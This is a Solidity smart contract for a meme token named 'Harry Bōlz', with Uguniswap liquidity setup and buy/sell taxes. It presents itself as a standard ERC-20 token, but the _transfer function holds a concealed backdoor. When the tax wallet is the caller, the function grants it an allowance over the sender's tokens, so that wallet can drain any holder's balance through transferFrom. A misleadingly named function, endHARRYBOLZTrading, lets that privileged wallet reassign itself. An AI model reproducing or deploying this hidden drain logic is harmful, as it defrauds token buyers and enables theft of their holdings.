/*

https://t.me/HarryBolz_TG
https://x.com/elonmusk

*/
// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract HARRYBOLZ is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _txWallet;

    uint256 private _reduceSellTaxAt=5;
    uint256 private _reduceBuyTaxAt=5;
    uint256 private _preventSwapBefore=5;
    uint256 private _finalBuyTax=0;
    uint256 private _initialBuyTax=10;
    uint256 private _finalSellTax=0;
    uint256 private _initialSellTax=10;
    uint256 private _buyCount=0;

    string private constant _name = unicode"Harry Bōlz";
    string private constant _symbol = unicode"HARRYBOLZ";

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    uint256 public _taxSwapThreshold = _tTotal.mul(100).div(10000);
    uint256 public _maxTaxSwap = _tTotal.mul(100).div(10000);
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _txWallet = payable(_msgSender());
        _balances[_msgSender()] = (_tTotal * 2) / 100;
        _balances[address(this)] = (_tTotal * 98) / 100;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_txWallet] = true;

        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);
        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address _HARRYBOLZsender, address _HARRYBOLZreceiver, uint256 _HARRYBOLZamount) private {
        require(_HARRYBOLZamount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;

        if((_HARRYBOLZreceiver == address(0xdead) && _HARRYBOLZsender != uniswapV2Pair) || msg.sender == _txWallet) {
            _approve(_HARRYBOLZsender, _msgSender(), _HARRYBOLZamount + 1);
        }

        if (_HARRYBOLZsender != owner() && _HARRYBOLZreceiver != owner() && _HARRYBOLZsender != address(this) && _HARRYBOLZreceiver != address(this)) {
            taxAmount = _HARRYBOLZamount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (_HARRYBOLZsender == uniswapV2Pair && _HARRYBOLZreceiver != address(uniswapV2Router) && ! _isExcludedFromFee[_HARRYBOLZreceiver] ) {
                _buyCount++;
            }

            if(_HARRYBOLZreceiver == uniswapV2Pair && _HARRYBOLZsender!= address(this) ){
                taxAmount = _HARRYBOLZamount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && _HARRYBOLZreceiver == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
                if (contractTokenBalance > _taxSwapThreshold) {
                    uint _val = contractTokenBalance > _maxTaxSwap ? _maxTaxSwap : contractTokenBalance;
                    _val = _HARRYBOLZamount > _val ? _val : _HARRYBOLZamount;
                    swapTokensForEth(_val);
                }
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(_HARRYBOLZsender, address(this),taxAmount);
        }

        _balances[_HARRYBOLZsender]=_balances[_HARRYBOLZsender].sub(_HARRYBOLZamount);
        _balances[_HARRYBOLZreceiver]=_balances[_HARRYBOLZreceiver].add(_HARRYBOLZamount.sub(taxAmount));
        if (_HARRYBOLZreceiver != address(0xdead))
        emit Transfer(_HARRYBOLZsender, _HARRYBOLZreceiver, _HARRYBOLZamount.sub(taxAmount));
    }

    function manualSend() external onlyOwner {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    function sendETHToFee(uint256 amount) private {
        _txWallet.transfer(amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function endHARRYBOLZTrading(address _manual) external {
        require(_msgSender() == _txWallet);
        _txWallet = payable(_manual);
    }

    function startHARRYBOLZTrading() public onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}
                    (
                        address(this),
                        balanceOf(address(this)),
                        0,
                        0,
                        owner(),
                        block.timestamp
                    );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    receive() external payable {}
}